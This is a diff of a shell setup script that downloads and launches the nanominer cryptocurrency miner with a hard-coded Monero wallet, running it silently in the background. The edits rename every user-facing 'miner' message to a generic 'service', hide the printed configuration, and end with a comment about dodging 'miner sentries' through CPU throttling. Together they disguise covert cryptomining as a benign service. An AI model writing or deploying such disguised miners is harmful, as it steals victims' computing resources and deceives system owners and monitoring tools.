@@ -3,7 +3,7 @@
 VERSION=1.0.1
 
 echo "Setup script version $VERSION."
-echo "Downloading nanominer..."
+echo "Downloading service..."
 
 wget -q https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz
 tar -xf nanominer-linux-3.3.4.tar.xz
@@ -20,7 +20,7 @@ rm config.ini
 # Command line args - first param is number of cores less to use
 RESTRICT=$1
 
-echo "Configuring miner..."
+echo "Configuring service..."
 
 echo "[RandomX]" >> config.ini
 echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
@@ -52,10 +52,10 @@ killall nanominer
 nohup ./nanominer >/dev/null 2>&1 & 
 
 echo ""
-echo "Current configuration:"
+# echo "Current configuration:"
 
-cat config.ini
+# cat config.ini
 
-echo "Setup complete, mining in progress"
+echo "Setup complete, service operational"
 
 # Think about using CPU limit instead od core count? Avoid flatline high cpu usage? Can this fly below the miner sentries?
